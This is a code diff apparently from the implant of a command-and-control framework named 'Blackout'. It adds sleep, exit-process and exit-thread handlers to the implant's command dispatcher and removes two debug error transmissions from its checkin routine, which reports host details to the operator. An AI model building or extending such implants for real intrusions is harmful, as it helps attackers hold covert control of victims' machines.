@@ -8,6 +8,9 @@ FUNC VOID CommandDispatcher(
     Instance()->Commands[ 0 ] = { .ID = BLACKOUT_CHECKIN, .Function = CommandCheckin };
     Instance()->Commands[ 1 ] = { .ID = COMMAND_RUN,      .Function = CommandRun };
     Instance()->Commands[ 2 ] = { .ID = COMMAND_EXPLORER, .Function = CommandExplorer };
+    Instance()->Commands[ 3 ] = { .ID = COMMAND_SLEEP,    .Function = CommandSleep };
+    Instance()->Commands[ 4 ] = { .ID = COMMAND_EXITP,    .Function = CommandExitProcess };
+    Instance()->Commands[ 5 ] = { .ID = COMMAND_EXITT,    .Function = CommandExitThread };
 
     PPACKAGE Package     = NULL;
     PARSER   Parser      = { 0 };
@@ -140,9 +143,6 @@ FUNC VOID CommandCheckin(
 ) {
     BLACKOUT_INSTANCE
 
-    PackageTransmitError( 0x3 );
-    PackageTransmitError( 0x00000115 );
-
     BK_PACKAGE = PackageCreate( BLACKOUT_CHECKIN );
 
     PackageAddInt32( BK_PACKAGE, Instance()->Base.Buffer  );
@@ -173,4 +173,41 @@ FUNC VOID CommandCheckin(
     PackageAddWString( BK_PACKAGE, Instance()->Transport.UserAgent );
 
     PackageTransmit( BK_PACKAGE, NULL, NULL );
+}
+
+FUNC VOID CommandSleep(
+    PPARSER Parser
+) {
+    BLACKOUT_INSTANCE
+
+    BK_PACKAGE = PackageCreate( COMMAND_SLEEP );
+
+    DWORD SleepTime = ParserGetInt32( Parser );
+
+    BK_PRINT( "%d\n", SleepTime );
+
+    Instance()->Session.SleepTime = SleepTime;
+
+    PackageAddInt32( BK_PACKAGE, SleepTime );
+    PackageTransmit( BK_PACKAGE, NULL, NULL ); 
+}
+
+FUNC VOID CommandExitProcess(
+    PPARSER Parser
+) {
+    BLACKOUT_INSTANCE
+
+    BK_PACKAGE = PackageCreate( COMMAND_EXITP );
+
+    Instance()->Win32.RtlExitUserProcess( 0 );
+}
+
+FUNC VOID CommandExitThread(
+    PPARSER Parser
+) {
+    BLACKOUT_INSTANCE
+
+    BK_PACKAGE = PackageCreate( COMMAND_EXITT );
+
+    Instance()->Win32.RtlExitUserThread( 0 );
 }
